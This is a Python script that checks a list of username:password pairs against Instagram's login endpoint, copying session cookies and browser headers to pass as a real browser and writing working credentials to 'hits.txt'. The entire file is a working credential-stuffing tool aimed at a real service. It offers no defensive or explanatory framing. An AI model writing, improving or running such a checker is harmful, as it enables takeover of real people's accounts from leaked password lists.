import re
import urllib3
from bs4 import BeautifulSoup
import requests
import time

url = "https://www.instagram.com/accounts/login/ajax/"

response0 = requests.get(url)
csrftoken0 =(str(response0.cookies).split(" for")[0].split("=")[-1])
mid = ((str(response0.cookies).split(" for")[-2].split("=")[-1]))
ig_did = (str(response0.cookies).split(" for")[1].split("=")[1])
ig_nrcb = (str(response0.cookies).split(" for")[2].split("=")[1])
#print(f"csrftoken={csrftoken0}; mid={mid}; ig_did={ig_did}; ig_nrcb={ig_nrcb}")
cookie = (f"csrftoken={csrftoken0}; mid={mid}; ig_did={ig_did}; ig_nrcb={ig_nrcb}")

Header = {
        "accept":"*/*",
        "accept-encoding":"gzip, deflate, br",
        "accept-language":"en-US,en;q=0.5",
        "connection":"keep-alive",
        "content-length":"343",
        "content-type":"application/x-www-form-urlencoded",
        "cookie":cookie,
        "dnt":"1",
        "host":"www.instagram.com",
        "origin":"https://www.instagram.com",
        "referer":"https://www.instagram.com/",
        "sec-fetch-dest":"empty",
        "sec-fetch-mode":"cors",
        "sec-fetch-site":"same-origin",
        "sec-gpc":"1",
        "user-agent":"Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
        "x-asbd-id":"198387",
        "x-csrftoken":csrftoken0,
        "x-ig-app-id":"936619743392459",
        "x-ig-www-claim":"0",
        "x-instagram-ajax":"45f20c1511ec-hot",
        "x-requested-with":"XMLHttpRequest"
}


def login_insta():
    try:
        List0 = str(input("Enter The List : "))
        with open(List0,"r") as f:
            for i in f:
                acc = i.split(":")

                data = {
                    "username":f"{acc[0]}",
                    "enc_password":f"#PWD_INSTAGRAM_BROWSER:0:&:{acc[1]}"
                    
                }
                with requests.Session() as req:

                    urllib3.disable_warnings()
                    r = req.post(url , data=data,headers=Header).text

                    if ('"authenticated":false') in r:
                        print("Failed Login")

                        with open("Bad.txt","a") as b :
                            b.write(f"{acc[0]}:{acc[1]}")

                    elif ('"user":true' and '"authenticated":true' and '"status":"ok"') in r:
                        print("Successful Login")

                        with open("hits.txt","a") as h:
                            h.write(f"{acc[0]}:{acc[1]}") 

                    time.sleep(1)
    except Exception:
        print("Error")
login_insta()